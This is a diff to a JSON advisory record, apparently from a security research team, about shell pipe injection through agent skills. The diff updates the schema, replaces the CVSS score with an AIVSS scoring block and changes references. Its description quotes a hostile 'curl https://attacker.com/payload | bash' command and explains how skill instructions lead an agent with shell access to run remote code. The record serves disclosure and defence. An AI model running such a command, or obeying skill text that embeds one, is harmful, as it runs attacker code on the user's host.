@@ -1,9 +1,9 @@
 {
   "ave_id": "AVE-2026-00004",
-  "schema_version": "0.1.0",
+  "schema_version": "0.2.0",
   "component_type": "skill",
   "title": "Arbitrary code execution via shell pipe injection in agentic component",
-  "attack_class": "Tool Abuse \u2014 Shell Pipe Injection",
+  "attack_class": "Tool Abuse - Shell Pipe Injection",
   "description": "An agentic component embeds shell pipe patterns such as `curl https://attacker.com/payload | bash` in its instructions. When an agent with shell or code-execution tool access follows these instructions, arbitrary remote code executes on the host with the agent's privilege level. The attack is delivered through natural language rather than code, making it invisible to traditional SAST scanners.",
   "affected_platforms": [
     "claude-code",
@@ -17,8 +17,8 @@
     "agentskills.io",
     "github.com/topics/agent-skills"
   ],
-  "cvss_ai_score": 8.8,
-  "cvss_ai_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+  "aivss_score": 5.9,
+  "cvss_base_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
   "owasp_mapping": [
     "ASI01",
     "ASI07"
@@ -48,9 +48,39 @@
   "researcher": "Bawbel Security Research Team",
   "researcher_url": "https://bawbel.io",
   "published": "2026-04-19T09:00:00Z",
-  "last_updated": "2026-04-19T09:00:00Z",
+  "last_updated": "2026-05-12T00:00:00Z",
   "references": [
     "https://owasp.org/www-project-top-10-for-large-language-model-applications/",
-    "https://github.com/bawbel/bawbel-ave/blob/main/SPEC.md"
+    "https://github.com/bawbel/ave/blob/main/SPEC.md"
+  ],
+  "aivss": {
+    "cvss_base": 8.8,
+    "aarf": {
+      "autonomy": 1.0,
+      "tool_use": 1.0,
+      "multi_agent": 0.5,
+      "non_determinism": 0.5,
+      "self_modification": 0.0,
+      "dynamic_identity": 0.0,
+      "persistent_memory": 0.0,
+      "natural_language_input": 1.0,
+      "data_access": 0.5,
+      "external_dependencies": 1.0
+    },
+    "aars": 5.5,
+    "thm": 1.0,
+    "mitigation_factor": 0.83,
+    "aivss_score": 5.9,
+    "aivss_severity": "MEDIUM",
+    "spec_version": "0.8",
+    "notes": "curl|bash pattern. Active in wild. NL delivery invisible to SAST.",
+    "owasp_mcp_mapping": [
+      "MCP01",
+      "MCP03"
+    ]
+  },
+  "owasp_mcp": [
+    "MCP01",
+    "MCP03"
   ]
 }
